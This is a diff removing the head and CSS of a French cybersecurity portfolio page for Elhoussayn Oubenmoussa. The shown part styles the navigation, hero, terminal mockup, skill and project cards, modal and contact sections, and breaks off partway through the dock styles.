@@ -1,1996 +1,794 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-<meta name="theme-color" content="#000000" />
-<title>Elhoussayn Oubenmoussa — Cybersécurité</title>
-
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
-<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
-
-<style>
-:root {
-  --serif: 'Instrument Serif', serif;
-  --sans: 'Inter', -apple-system, system-ui, sans-serif;
-  --mono: 'JetBrains Mono', ui-monospace, monospace;
-  --accent: #6cf6ff;
-  --accent-2: #ff5c8a;
-  --warn: #ffb547;
-  --ink: #ffffff;
-  --ink-dim: rgba(255,255,255,0.66);
-  --ink-faint: rgba(255,255,255,0.38);
-}
-
-* { margin: 0; padding: 0; box-sizing: border-box; }
-html { scroll-behavior: smooth; }
-body {
-  font-family: var(--sans);
-  font-weight: 400;
-  color: var(--ink);
-  background: #000;
-  overflow-x: hidden;
-  min-height: 100vh;
-  -webkit-font-smoothing: antialiased;
-  text-rendering: optimizeLegibility;
-}
-::selection { background: var(--accent); color: #000; }
-
-/* ============================================================
-   WEBGL CANVAS BACKGROUND
-============================================================ */
-#bgCanvas {
-  position: fixed;
-  top: 0; left: 0;
-  width: 100%; height: 100%;
-  z-index: 0;
-  display: block;
-}
-.bg-vignette {
-  position: fixed; inset: 0;
-  z-index: 1;
-  pointer-events: none;
-  background:
-    radial-gradient(ellipse at center, transparent 30%, rgba(0,0,0,0.55) 100%),
-    linear-gradient(to bottom, rgba(0,0,0,0.2), transparent 30%, transparent 70%, rgba(0,0,0,0.5));
-}
-.bg-grain {
-  position: fixed; inset: 0;
-  z-index: 2;
-  pointer-events: none;
-  opacity: 0.06;
-  mix-blend-mode: overlay;
-  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
-}
-
-main { position: relative; z-index: 5; }
-
-/* ============================================================
-   GLASS PRIMITIVES
-============================================================ */
-.glass {
-  position: relative;
-  background: rgba(255,255,255,0.06);
-  backdrop-filter: blur(22px) saturate(160%);
-  -webkit-backdrop-filter: blur(22px) saturate(160%);
-  border: 1px solid rgba(255,255,255,0.16);
-  box-shadow:
-    0 6px 6px rgba(0,0,0,0.22),
-    0 18px 50px rgba(0,0,0,0.34),
-    inset 1px 1px 1px rgba(255,255,255,0.34),
-    inset -1px -1px 1px rgba(255,255,255,0.18);
-  transition: transform 0.7s cubic-bezier(0.175, 0.885, 0.32, 2.2),
-              border-color 0.5s, box-shadow 0.5s, padding 0.6s;
-  overflow: hidden;
-}
-.glass::before {
-  content: '';
-  position: absolute; inset: 0;
-  background:
-    linear-gradient(135deg, rgba(255,255,255,0.16) 0%, transparent 40%, transparent 60%, rgba(255,255,255,0.06) 100%);
-  pointer-events: none;
-  border-radius: inherit;
-  z-index: 1;
-}
-.glass > * { position: relative; z-index: 2; }
-
-.glass-strong {
-  background: rgba(255,255,255,0.1);
-  backdrop-filter: blur(30px) saturate(200%);
-  -webkit-backdrop-filter: blur(30px) saturate(200%);
-  border: 1px solid rgba(255,255,255,0.22);
-}
-
-.container { max-width: 1280px; margin: 0 auto; padding: 0 28px; }
-@media (max-width: 600px) { .container { padding: 0 18px; } }
-
-/* ============================================================
-   TOP NAV — liquid pill
-============================================================ */
-.topnav {
-  position: fixed; top: 18px; left: 50%;
-  transform: translateX(-50%);
-  z-index: 100;
-  padding: 8px 8px 8px 22px;
-  border-radius: 999px;
-  display: flex; align-items: center; gap: 18px;
-  font-size: 13px;
-  font-weight: 500;
-  max-width: calc(100vw - 32px);
-}
-.topnav .brand {
-  font-family: var(--serif);
-  font-style: italic;
-  font-size: 20px;
-  letter-spacing: -0.01em;
-  white-space: nowrap;
-  display: flex; align-items: center; gap: 8px;
-}
-.topnav .brand sup { color: var(--accent); font-size: 0.55em; vertical-align: 0.6em; }
-.topnav ul {
-  list-style: none;
-  display: flex; gap: 4px;
-}
-.topnav ul a {
-  display: block;
-  padding: 8px 14px;
-  border-radius: 999px;
-  text-decoration: none;
-  color: var(--ink-dim);
-  transition: background 0.3s, color 0.3s;
-  font-size: 13px;
-}
-.topnav ul a:hover, .topnav ul a.active {
-  color: #000;
-  background: var(--accent);
-}
-.topnav .cta {
-  padding: 9px 16px;
-  border-radius: 999px;
-  background: rgba(255,255,255,0.92);
-  color: #000;
-  text-decoration: none;
-  font-weight: 600;
-  font-size: 13px;
-  transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 2.2);
-  white-space: nowrap;
-}
-.topnav .cta:hover { transform: scale(1.06); }
-
-.nav-toggle {
-  display: none;
-  background: rgba(255,255,255,0.1);
-  border: 1px solid rgba(255,255,255,0.2);
-  color: var(--ink);
-  width: 36px; height: 36px;
-  border-radius: 50%;
-  cursor: pointer;
-  font-size: 14px;
-}
-
-@media (max-width: 760px) {
-  .topnav { padding: 6px 6px 6px 16px; gap: 10px; }
-  .topnav ul { display: none; position: absolute; top: 60px; left: 50%; transform: translateX(-50%); flex-direction: column; padding: 12px; min-width: 220px; border-radius: 22px; background: rgba(20,20,30,0.85); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.16); }
-  .topnav ul.open { display: flex; }
-  .topnav ul a { padding: 12px 16px; border-radius: 14px; }
-  .topnav .cta { display: none; }
-  .nav-toggle { display: flex; align-items: center; justify-content: center; }
-  .topnav .brand { font-size: 17px; }
-}
-
-/* ============================================================
-   HERO
-============================================================ */
-.hero {
-  min-height: 100vh;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  padding: 120px 28px 80px;
-  text-align: center;
-  position: relative;
-}
-.hero-badge {
-  display: inline-flex; align-items: center; gap: 10px;
-  padding: 8px 18px;
-  border-radius: 999px;
-  font-size: 12px;
-  font-weight: 500;
-  letter-spacing: 0.04em;
-  margin-bottom: 32px;
-  font-family: var(--mono);
-}
-.hero-badge .dot {
-  width: 8px; height: 8px; border-radius: 50%;
-  background: var(--accent);
-  box-shadow: 0 0 12px var(--accent);
-  animation: pulse 1.6s ease-in-out infinite;
-}
-@keyframes pulse {
-  0%, 100% { opacity: 1; transform: scale(1); }
-  50% { opacity: 0.5; transform: scale(0.7); }
-}
-
-.hero h1 {
-  font-family: var(--serif);
-  font-weight: 400;
-  font-size: clamp(52px, 11vw, 168px);
-  line-height: 0.92;
-  letter-spacing: -0.03em;
-  margin-bottom: 28px;
-  max-width: 14ch;
-}
-.hero h1 em {
-  font-style: italic;
-  color: var(--accent);
-  display: inline-block;
-  background: linear-gradient(180deg, var(--accent), #fff 90%);
-  -webkit-background-clip: text;
-  background-clip: text;
-  -webkit-text-fill-color: transparent;
-}
-.hero h1 .word {
-  display: inline-block;
-  opacity: 0;
-  transform: translateY(40px);
-  animation: word-in 1s cubic-bezier(0.2,0.8,0.2,1) forwards;
-}
-.hero h1 .word:nth-child(1) { animation-delay: 0.2s; }
-.hero h1 .word:nth-child(2) { animation-delay: 0.4s; }
-@keyframes word-in {
-  to { opacity: 1; transform: translateY(0); }
-}
-
-.hero-tagline {
-  font-size: clamp(15px, 1.6vw, 19px);
-  color: var(--ink-dim);
-  max-width: 56ch;
-  line-height: 1.5;
-  margin-bottom: 44px;
-  font-weight: 300;
-  opacity: 0;
-  animation: fade-up 1s cubic-bezier(0.2,0.8,0.2,1) 0.6s forwards;
-}
-@keyframes fade-up {
-  from { opacity: 0; transform: translateY(20px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-
-.hero-buttons {
-  display: flex; gap: 14px; flex-wrap: wrap;
-  justify-content: center;
-  opacity: 0;
-  animation: fade-up 1s cubic-bezier(0.2,0.8,0.2,1) 0.8s forwards;
-}
-
-.glass-btn {
-  display: inline-flex; align-items: center; gap: 10px;
-  padding: 16px 28px;
-  border-radius: 999px;
-  font-size: 14px;
-  font-weight: 500;
-  text-decoration: none;
-  color: var(--ink);
-  cursor: pointer;
-  background: rgba(255,255,255,0.08);
-  backdrop-filter: blur(22px) saturate(160%);
-  -webkit-backdrop-filter: blur(22px) saturate(160%);
-  border: 1px solid rgba(255,255,255,0.18);
-  box-shadow:
-    0 6px 12px rgba(0,0,0,0.22),
-    inset 1px 1px 1px rgba(255,255,255,0.36);
-  transition: all 0.7s cubic-bezier(0.175, 0.885, 0.32, 2.2);
-  overflow: hidden;
-  position: relative;
-}
-.glass-btn:hover {
-  padding: 18px 32px;
-  background: rgba(255,255,255,0.15);
-  transform: translateY(-2px);
-  box-shadow:
-    0 10px 26px rgba(0,0,0,0.3),
-    inset 1px 1px 2px rgba(255,255,255,0.5);
-}
-.glass-btn.primary {
-  background: linear-gradient(180deg, rgba(255,255,255,0.95), rgba(255,255,255,0.85));
-  color: #000;
-  border-color: rgba(255,255,255,0.6);
-}
-.glass-btn.primary:hover {
-  background: linear-gradient(180deg, var(--accent), #fff);
-}
-.glass-btn i { transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 2.2); }
-.glass-btn:hover i { transform: translateX(4px); }
-
-.hero-meta {
-  position: absolute;
-  bottom: 40px; left: 50%;
-  transform: translateX(-50%);
-  display: flex; gap: 32px;
-  font-family: var(--mono);
-  font-size: 11px;
-  color: var(--ink-faint);
-  letter-spacing: 0.12em;
-  text-transform: uppercase;
-  opacity: 0;
-  animation: fade-up 1s cubic-bezier(0.2,0.8,0.2,1) 1.2s forwards;
-}
-.hero-meta span { display: flex; align-items: center; gap: 8px; }
-@media (max-width: 600px) {
-  .hero-meta { gap: 16px; bottom: 24px; font-size: 9px; }
-}
-
-/* ============================================================
-   SCROLL REVEAL CONTAINER (3D card)
-============================================================ */
-.scroll-reveal {
-  height: 70rem;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  position: relative;
-  padding: 40px 20px;
-}
-@media (max-width: 768px) { .scroll-reveal { height: 50rem; padding: 20px; } }
-
-.scroll-inner {
-  width: 100%;
-  max-width: 1200px;
-  perspective: 1200px;
-  margin: 0 auto;
-}
-.scroll-title {
-  text-align: center;
-  margin-bottom: 40px;
-  will-change: transform;
-}
-.scroll-title .kicker {
-  font-family: var(--mono);
-  font-size: 12px;
-  letter-spacing: 0.18em;
-  text-transform: uppercase;
-  color: var(--ink-dim);
-  margin-bottom: 18px;
-  display: block;
-}
-.scroll-title h2 {
-  font-family: var(--serif);
-  font-weight: 400;
-  font-size: clamp(48px, 8vw, 120px);
-  letter-spacing: -0.03em;
-  line-height: 1;
-}
-.scroll-title h2 em {
-  color: var(--accent);
-  font-style: italic;
-}
-
-.scroll-card {
-  width: 100%;
-  height: clamp(360px, 60vh, 640px);
-  border-radius: 28px;
-  border: 4px solid rgba(108, 108, 108, 0.4);
-  padding: 8px;
-  background: rgba(34, 34, 34, 0.6);
-  backdrop-filter: blur(20px);
-  -webkit-backdrop-filter: blur(20px);
-  box-shadow:
-    0 0 60px rgba(0,0,0,0.4),
-    0 84px 50px rgba(0,0,0,0.18),
-    0 149px 60px rgba(0,0,0,0.04);
-  will-change: transform;
-  transform-style: preserve-3d;
-}
-.scroll-card-inner {
-  height: 100%; width: 100%;
-  border-radius: 18px;
-  background: #0a0a0c;
-  overflow: hidden;
-  position: relative;
-}
-
-/* Terminal-style mockup inside the card */
-.term {
-  height: 100%;
-  display: flex; flex-direction: column;
-  font-family: var(--mono);
-  font-size: 13px;
-}
-.term-bar {
-  display: flex; align-items: center; gap: 8px;
-  padding: 12px 16px;
-  background: rgba(255,255,255,0.03);
-  border-bottom: 1px solid rgba(255,255,255,0.06);
-}
-.term-bar .lights { display: flex; gap: 6px; }
-.term-bar .lights span { width: 12px; height: 12px; border-radius: 50%; }
-.term-bar .lights span:nth-child(1) { background: #ff5f57; }
-.term-bar .lights span:nth-child(2) { background: #febc2e; }
-.term-bar .lights span:nth-child(3) { background: #28c840; }
-.term-bar .title {
-  flex: 1; text-align: center;
-  color: var(--ink-faint); font-size: 11px;
-  letter-spacing: 0.05em;
-}
-.term-body {
-  flex: 1;
-  padding: 24px clamp(16px, 4vw, 40px);
-  color: rgba(255,255,255,0.86);
-  overflow: hidden;
-  position: relative;
-}
-.term-line { display: block; line-height: 1.9; }
-.term-line .prompt { color: var(--accent); }
-.term-line .cmd { color: #fff; }
-.term-line .out { color: var(--ink-dim); }
-.term-line .key { color: var(--accent-2); }
-.term-line .val { color: var(--warn); }
-.term-line .cmt { color: var(--ink-faint); font-style: italic; }
-.term-cursor {
-  display: inline-block; width: 8px; height: 1em;
-  background: var(--accent);
-  vertical-align: middle;
-  animation: blink 1s steps(2) infinite;
-}
-@keyframes blink { 50% { opacity: 0; } }
-
-.term-stats {
-  position: absolute;
-  bottom: 16px; right: 24px;
-  display: flex; gap: 16px;
-  font-size: 10px;
-  color: var(--ink-faint);
-  letter-spacing: 0.1em;
-}
-@media (max-width: 600px) { .term-stats { display: none; } .term-body { padding: 18px; font-size: 11px; } }
-
-/* ============================================================
-   GENERIC SECTIONS
-============================================================ */
-.section {
-  padding: 120px 0;
-  position: relative;
-}
-.section-head {
-  margin-bottom: 56px;
-  display: flex; align-items: end; justify-content: space-between;
-  gap: 32px;
-  flex-wrap: wrap;
-}
-.section-head .left { max-width: 64ch; }
-.section-head .kicker {
-  display: inline-flex; align-items: center; gap: 10px;
-  font-family: var(--mono);
-  font-size: 11px;
-  letter-spacing: 0.18em;
-  text-transform: uppercase;
-  color: var(--ink-dim);
-  margin-bottom: 18px;
-}
-.section-head .kicker::before {
-  content: ''; display: inline-block;
-  width: 22px; height: 1px;
-  background: var(--accent);
-}
-.section-head h2 {
-  font-family: var(--serif);
-  font-weight: 400;
-  font-size: clamp(40px, 6vw, 80px);
-  line-height: 1;
-  letter-spacing: -0.025em;
-  margin-bottom: 18px;
-}
-.section-head h2 em {
-  font-style: italic;
-  color: var(--accent);
-}
-.section-head p {
-  color: var(--ink-dim);
-  font-size: 16px;
-  line-height: 1.6;
-  font-weight: 300;
-  max-width: 56ch;
-}
-
-/* ============================================================
-   ABOUT
-============================================================ */
-.about-grid {
-  display: grid;
-  grid-template-columns: 1fr 1.4fr;
-  gap: 32px;
-  align-items: stretch;
-}
-@media (max-width: 900px) {
-  .about-grid { grid-template-columns: 1fr; }
-}
-.about-portrait {
-  border-radius: 28px;
-  padding: 16px;
-  display: flex; flex-direction: column; gap: 16px;
-}
-.about-portrait .frame {
-  flex: 1;
-  border-radius: 16px;
-  overflow: hidden;
-  position: relative;
-  min-height: 320px;
-  background:
-    linear-gradient(135deg, rgba(108,246,255,0.18), transparent 40%),
-    radial-gradient(circle at 30% 30%, rgba(255,92,138,0.18), transparent 50%),
-    #0a0a0c;
-  display: flex; align-items: center; justify-content: center;
-}
-.about-portrait .frame img {
-  width: 100%; height: 100%;
-  object-fit: cover;
-}
-.about-portrait .frame .placeholder {
-  font-family: var(--serif);
-  font-style: italic;
-  font-size: 120px;
-  background: linear-gradient(180deg, var(--accent), var(--accent-2));
-  -webkit-background-clip: text;
-  background-clip: text;
-  -webkit-text-fill-color: transparent;
-  letter-spacing: -0.04em;
-}
-.about-portrait .meta {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 8px;
-  font-family: var(--mono);
-  font-size: 11px;
-}
-.about-portrait .meta div {
-  padding: 12px 14px;
-  background: rgba(255,255,255,0.04);
-  border: 1px solid rgba(255,255,255,0.08);
-  border-radius: 12px;
-}
-.about-portrait .meta .k {
-  display: block;
-  color: var(--ink-faint);
-  margin-bottom: 4px;
-  letter-spacing: 0.06em;
-  text-transform: uppercase;
-  font-size: 9px;
-}
-.about-portrait .meta .v { color: var(--ink); font-weight: 500; }
-
-.about-text {
-  border-radius: 28px;
-  padding: 40px;
-  display: flex; flex-direction: column; gap: 18px;
-}
-.about-text .lead {
-  font-family: var(--serif);
-  font-style: italic;
-  font-size: clamp(22px, 2.5vw, 30px);
-  line-height: 1.3;
-  letter-spacing: -0.01em;
-  margin-bottom: 6px;
-}
-.about-text .lead em { color: var(--accent); }
-.about-text p {
-  color: var(--ink-dim);
-  font-size: 15px;
-  line-height: 1.7;
-  font-weight: 300;
-}
-.about-text p strong { color: var(--ink); font-weight: 500; }
-
-.timeline {
-  margin-top: 24px;
-  border-top: 1px solid rgba(255,255,255,0.08);
-}
-.timeline-row {
-  display: grid;
-  grid-template-columns: 80px 1fr auto;
-  gap: 18px;
-  padding: 18px 0;
-  border-bottom: 1px solid rgba(255,255,255,0.08);
-  align-items: baseline;
-  font-family: var(--mono);
-  font-size: 13px;
-}
-.timeline-row .yr { color: var(--accent); font-weight: 500; }
-.timeline-row .desc { color: var(--ink); font-family: var(--sans); font-size: 14px; line-height: 1.5; }
-.timeline-row .desc small { display: block; color: var(--ink-dim); font-size: 12px; margin-top: 2px; }
-.timeline-row .tag {
-  font-size: 9px;
-  padding: 4px 8px;
-  border: 1px solid rgba(255,255,255,0.16);
-  border-radius: 999px;
-  letter-spacing: 0.12em;
-  text-transform: uppercase;
-  color: var(--ink-dim);
-}
-.timeline-row.now .tag { color: var(--accent); border-color: var(--accent); }
-
-@media (max-width: 600px) {
-  .about-text { padding: 28px 22px; }
-  .timeline-row { grid-template-columns: 60px 1fr; }
-  .timeline-row .tag { display: none; }
-}
-
-/* ============================================================
-   SKILLS
-============================================================ */
-.skills-grid {
-  display: grid;
-  grid-template-columns: repeat(4, 1fr);
-  gap: 16px;
-}
-@media (max-width: 1000px) { .skills-grid { grid-template-columns: repeat(2, 1fr); } }
-@media (max-width: 600px) { .skills-grid { grid-template-columns: 1fr; } }
-
-.skill-card {
-  border-radius: 24px;
-  padding: 28px;
-  min-height: 240px;
-  display: flex; flex-direction: column;
-  cursor: default;
-  transition: transform 0.7s cubic-bezier(0.175, 0.885, 0.32, 2.2);
-}
-.skill-card:hover { transform: translateY(-6px); }
-.skill-card .num {
-  font-family: var(--serif);
-  font-style: italic;
-  font-size: 14px;
-  color: var(--ink-faint);
-  margin-bottom: 24px;
-}
-.skill-card .icon-box {
-  width: 44px; height: 44px;
-  border-radius: 14px;
-  background: linear-gradient(135deg, rgba(108,246,255,0.3), rgba(108,246,255,0.06));
-  border: 1px solid rgba(108,246,255,0.25);
-  display: flex; align-items: center; justify-content: center;
-  font-size: 18px;
-  color: var(--accent);
-  margin-bottom: 18px;
-}
-.skill-card h3 {
-  font-family: var(--serif);
-  font-weight: 400;
-  font-size: 26px;
-  line-height: 1.05;
-  letter-spacing: -0.02em;
-  margin-bottom: 10px;
-}
-.skill-card p {
-  color: var(--ink-dim);
-  font-size: 13px;
-  line-height: 1.55;
-  font-weight: 300;
-  margin-bottom: 18px;
-  flex: 1;
-}
-.skill-card .bar {
-  height: 2px;
-  background: rgba(255,255,255,0.1);
-  border-radius: 2px;
-  position: relative;
-  overflow: hidden;
-}
-.skill-card .bar::after {
-  content: '';
-  position: absolute;
-  left: 0; top: 0; bottom: 0;
-  width: 0;
-  background: linear-gradient(90deg, var(--accent), #fff);
-  border-radius: 2px;
-  transition: width 1.4s cubic-bezier(0.2, 0.8, 0.2, 1);
-}
-.skill-card[data-w] .bar::after { width: 0; }
-.skill-card.in-view[data-w="70"] .bar::after { width: 70%; }
-.skill-card.in-view[data-w="75"] .bar::after { width: 75%; }
-.skill-card.in-view[data-w="65"] .bar::after { width: 65%; }
-.skill-card.in-view[data-w="60"] .bar::after { width: 60%; }
-
-.skill-card .stack {
-  display: flex; flex-wrap: wrap; gap: 6px;
-  margin-top: 14px;
-}
-.skill-card .stack span {
-  font-family: var(--mono);
-  font-size: 10px;
-  padding: 3px 8px;
-  border-radius: 999px;
-  background: rgba(255,255,255,0.06);
-  border: 1px solid rgba(255,255,255,0.1);
-  color: var(--ink-dim);
-}
-
-/* ============================================================
-   PROJECTS
-============================================================ */
-.projects-grid {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 16px;
-}
-@media (max-width: 800px) { .projects-grid { grid-template-columns: 1fr; } }
-
-.project-card {
-  border-radius: 24px;
-  padding: 32px;
-  cursor: pointer;
-  transition: transform 0.7s cubic-bezier(0.175, 0.885, 0.32, 2.2),
-              border-color 0.5s, padding 0.6s;
-  position: relative;
-  min-height: 260px;
-  display: flex; flex-direction: column;
-}
-.project-card:hover {
-  transform: translateY(-8px);
-  border-color: rgba(108,246,255,0.4);
-}
-.project-card:hover .project-arrow {
-  transform: translate(4px, -4px) rotate(0deg);
-  color: var(--accent);
-}
-.project-card:hover .project-num { color: var(--accent); }
-
-.project-head {
-  display: flex; justify-content: space-between; align-items: start;
-  margin-bottom: 24px;
-}
-.project-num {
-  font-family: var(--serif);
-  font-style: italic;
-  font-size: 32px;
-  color: var(--ink-faint);
-  transition: color 0.4s;
-  line-height: 1;
-}
-.project-arrow {
-  font-size: 22px;
-  color: var(--ink-dim);
-  transform: rotate(-45deg);
-  transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 2.2), color 0.4s;
-}
-.project-card h3 {
-  font-family: var(--serif);
-  font-weight: 400;
-  font-size: clamp(28px, 3vw, 38px);
-  letter-spacing: -0.02em;
-  line-height: 1.05;
-  margin-bottom: 12px;
-  flex: 1;
-}
-.project-card p {
-  color: var(--ink-dim);
-  font-size: 14px;
-  line-height: 1.55;
-  font-weight: 300;
-  margin-bottom: 20px;
-}
-.project-card .pills {
-  display: flex; flex-wrap: wrap; gap: 6px;
-  align-items: center;
-}
-.project-card .pills .pill {
-  font-family: var(--mono);
-  font-size: 10px;
-  padding: 4px 10px;
-  border-radius: 999px;
-  background: rgba(255,255,255,0.06);
-  border: 1px solid rgba(255,255,255,0.1);
-  color: var(--ink-dim);
-}
-.project-card .status {
-  margin-left: auto;
-  font-family: var(--mono);
-  font-size: 10px;
-  letter-spacing: 0.12em;
-  text-transform: uppercase;
-  color: var(--accent);
-  display: flex; align-items: center; gap: 6px;
-}
-.project-card .status::before {
-  content: '';
-  width: 6px; height: 6px; border-radius: 50%;
-  background: var(--accent);
-  box-shadow: 0 0 8px var(--accent);
-}
-
-/* ============================================================
-   PROJECT MODAL
-============================================================ */
-.modal-backdrop {
-  position: fixed; inset: 0;
-  background: rgba(0,0,0,0.6);
-  backdrop-filter: blur(20px);
-  -webkit-backdrop-filter: blur(20px);
-  z-index: 1000;
-  opacity: 0; pointer-events: none;
-  transition: opacity 0.5s;
-}
-.modal-backdrop.open { opacity: 1; pointer-events: all; }
-
-.modal {
-  position: fixed;
-  top: 24px; right: 24px; bottom: 24px;
-  width: min(640px, calc(100vw - 48px));
-  border-radius: 28px;
-  background: rgba(15,15,18,0.85);
-  backdrop-filter: blur(40px) saturate(180%);
-  -webkit-backdrop-filter: blur(40px) saturate(180%);
-  border: 1px solid rgba(255,255,255,0.16);
-  box-shadow: 0 30px 80px rgba(0,0,0,0.5), inset 1px 1px 1px rgba(255,255,255,0.16);
-  z-index: 1001;
-  transform: translateX(calc(100% + 32px));
-  transition: transform 0.6s cubic-bezier(0.7,0,0.2,1);
-  overflow: hidden;
-  display: flex;
-  flex-direction: column;
-}
-.modal.open { transform: translateX(0); }
-.modal-head {
-  display: flex; justify-content: space-between; align-items: center;
-  padding: 20px 28px;
-  border-bottom: 1px solid rgba(255,255,255,0.08);
-  flex-shrink: 0;
-}
-.modal-head .label {
-  font-family: var(--mono);
-  font-size: 11px;
-  color: var(--ink-dim);
-  letter-spacing: 0.14em;
-  text-transform: uppercase;
-}
-.modal-close {
-  width: 32px; height: 32px;
-  border-radius: 50%;
-  background: rgba(255,255,255,0.08);
-  border: 1px solid rgba(255,255,255,0.16);
-  color: var(--ink);
-  cursor: pointer;
-  display: flex; align-items: center; justify-content: center;
-  transition: all 0.3s;
-  font-size: 14px;
-}
-.modal-close:hover { background: var(--accent); color: #000; border-color: var(--accent); transform: scale(1.05); }
-
-.modal-body {
-  flex: 1;
-  overflow-y: auto;
-  -webkit-overflow-scrolling: touch;
-  padding: 32px 28px;
-}
-.modal-body h2 {
-  font-family: var(--serif);
-  font-weight: 400;
-  font-size: clamp(36px, 5vw, 52px);
-  letter-spacing: -0.02em;
-  line-height: 1.05;
-  margin-bottom: 8px;
-}
-.modal-body h2 em { color: var(--accent); font-style: italic; }
-.modal-body .sub {
-  color: var(--ink-dim);
-  font-size: 14px;
-  margin-bottom: 24px;
-  padding-bottom: 24px;
-  border-bottom: 1px solid rgba(255,255,255,0.08);
-}
-.modal-section { margin-bottom: 28px; }
-.modal-section h4 {
-  font-family: var(--mono);
-  font-size: 11px;
-  letter-spacing: 0.16em;
-  text-transform: uppercase;
-  color: var(--accent);
-  margin-bottom: 14px;
-  display: flex; align-items: center; gap: 10px;
-}
-.modal-section h4::before {
-  content: '';
-  width: 14px; height: 1px;
-  background: var(--accent);
-}
-.modal-section p {
-  color: var(--ink-dim);
-  font-size: 14px;
-  line-height: 1.7;
-  font-weight: 300;
-}
-.modal-section ul { list-style: none; padding: 0; margin: 0; }
-.modal-section ul li {
-  padding: 8px 0;
-  border-bottom: 1px dashed rgba(255,255,255,0.08);
-  font-size: 13px;
-  color: var(--ink-dim);
-  display: flex; gap: 12px;
-  font-weight: 300;
-}
-.modal-section ul li::before { content: '⟶'; color: var(--accent); flex-shrink: 0; }
-.modal-section ul li code {
-  font-family: var(--mono);
-  font-size: 12px;
-  background: rgba(255,255,255,0.06);
-  padding: 2px 6px;
-  border-radius: 4px;
-  color: var(--accent);
-}
-.modal-stack { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 4px; }
-.modal-stack .pill {
-  font-family: var(--mono);
-  font-size: 11px;
-  padding: 5px 11px;
-  border-radius: 999px;
-  background: rgba(108,246,255,0.1);
-  border: 1px solid rgba(108,246,255,0.2);
-  color: var(--accent);
-}
-.code-block {
-  font-family: var(--mono);
-  font-size: 12px;
-  line-height: 1.7;
-  background: rgba(0,0,0,0.4);
-  border: 1px solid rgba(255,255,255,0.08);
-  border-radius: 14px;
-  padding: 18px;
-  overflow-x: auto;
-  color: var(--ink-dim);
-  margin: 12px 0;
-}
-.code-block .cmt { color: var(--ink-faint); font-style: italic; }
-.code-block .cmd { color: var(--accent); }
-.code-block .arg { color: var(--warn); }
-.warn-box {
-  border-left: 2px solid var(--warn);
-  background: rgba(255,181,71,0.08);
-  padding: 14px 18px;
-  border-radius: 0 12px 12px 0;
-  font-size: 13px;
-  color: var(--ink-dim);
-  margin: 14px 0;
-  line-height: 1.6;
-}
-.warn-box strong { color: var(--warn); }
-
-@media (max-width: 700px) {
-  .modal { top: 0; right: 0; bottom: 0; width: 100vw; border-radius: 0; }
-  .modal-body { padding: 24px 20px; }
-  .modal-head { padding: 16px 20px; }
-}
-
-/* ============================================================
-   CONTACT
-============================================================ */
-.contact-card {
-  border-radius: 32px;
-  padding: clamp(36px, 5vw, 64px);
-  display: grid;
-  grid-template-columns: 1.2fr 1fr;
-  gap: 48px;
-  align-items: center;
-}
-@media (max-width: 900px) { .contact-card { grid-template-columns: 1fr; gap: 32px; } }
-
-.contact-headline {
-  font-family: var(--serif);
-  font-weight: 400;
-  font-size: clamp(40px, 6.5vw, 96px);
-  line-height: 0.95;
-  letter-spacing: -0.025em;
-}
-.contact-headline em { color: var(--accent); font-style: italic; }
-.contact-headline + .sub {
-  font-family: var(--serif);
-  font-style: italic;
-  font-size: 18px;
-  color: var(--ink-dim);
-  margin-top: 18px;
-  line-height: 1.4;
-  max-width: 36ch;
-}
-
-.contact-list { display: flex; flex-direction: column; gap: 4px; }
-.contact-row {
-  display: flex; align-items: center; gap: 16px;
-  padding: 16px 18px;
-  border-radius: 16px;
-  background: rgba(255,255,255,0.04);
-  border: 1px solid rgba(255,255,255,0.08);
-  text-decoration: none;
-  color: var(--ink);
-  transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 2.2);
-}
-.contact-row:hover {
-  background: rgba(108,246,255,0.1);
-  border-color: rgba(108,246,255,0.3);
-  transform: translateX(4px);
-}
-.contact-row .icon-box {
-  width: 38px; height: 38px;
-  border-radius: 12px;
-  background: rgba(108,246,255,0.12);
-  border: 1px solid rgba(108,246,255,0.2);
-  display: flex; align-items: center; justify-content: center;
-  color: var(--accent);
-  font-size: 14px;
-  flex-shrink: 0;
-}
-.contact-row .info { flex: 1; min-width: 0; }
-.contact-row .info .k {
-  display: block; font-family: var(--mono);
-  font-size: 10px; color: var(--ink-faint);
-  letter-spacing: 0.12em; text-transform: uppercase;
-  margin-bottom: 2px;
-}
-.contact-row .info .v {
-  font-size: 15px; color: var(--ink);
-  word-break: break-all;
-}
-.contact-row i.arrow {
-  color: var(--ink-faint);
-  font-size: 12px;
-  transition: transform 0.4s, color 0.4s;
-}
-.contact-row:hover i.arrow {
-  color: var(--accent);
-  transform: translate(2px, -2px);
-}
-
-/* ============================================================
-   DOCK (bottom liquid glass)
-============================================================ */
-.dock {
-  position: fixed;
-  bottom: 20px; left: 50%;
-  transform: translateX(-50%);
-  z-index: 100;
-  padding: 10px;
-  border-radius: 24px;
-  display: flex;
-  gap: 8px;
-  background: rgba(255,255,255,0.08);
-  backdrop-filter: blur(30px) saturate(180%);
-  -webkit-backdrop-filter: blur(30px) saturate(180%);
-  border: 1px solid rgba(255,255,255,0.16);
-  box-shadow:
-    0 10px 30px rgba(0,0,0,0.34),
-    inset 1px 1px 1px rgba(255,255,255,0.34);
